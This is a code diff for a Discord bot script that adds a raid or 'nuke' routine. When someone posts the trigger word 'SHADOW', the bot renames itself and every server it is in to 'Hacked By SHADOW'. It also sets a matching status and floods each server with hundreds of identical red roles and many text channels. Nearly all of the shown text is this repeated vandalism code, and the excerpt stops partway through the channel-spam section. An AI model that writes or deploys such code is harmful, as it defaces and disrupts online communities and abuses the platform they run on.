@@ -41,7 +41,7 @@ LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/519891078502154250/5
 var x1 = "SHADOW"
 LOka.on('message', message => {
      if (message.content === "SHADOW") {
-LOka.user.setUsername("Hacked By ??? ")
+LOka.user.setUsername("Hacked By SHADOW ")
 
 
  
@@ -49,7 +49,7 @@ LOka.user.setUsername("Hacked By ??? ")
 });
 LOka.on('message', message => {
      if (message.content === "SHADOW") {
-LOka.user.setGame(`Hacked By ???`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`Hacked By SHADOW`,'https://www.twitch.tv/hix')
  
 }
 });
@@ -64,7 +64,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === "SHADOW") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked By ???`)
+             m.setName(`Hacked By SHADOW`)
 })
 }
 });
@@ -84,157 +84,1022 @@ LOka.on('message', message => {
      if (message.content === "SHADOW") {
          LOka.guilds.forEach(m =>{
   m.createRole({
-        name : "Hacked By - ???? ,$ ",
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+ 
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+     m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+ 
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+ 
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
         permissions :   [1],
         color : " #ff0000"
     })
- m.createRole({
-        name : "Hacked By - ???? ,$ ",
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	    m.createRole({
+        name : "Hacked By - SHADOW ,$ ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked By - SHADOW ,$",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -249,305 +1114,1303 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === "SHADOW") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
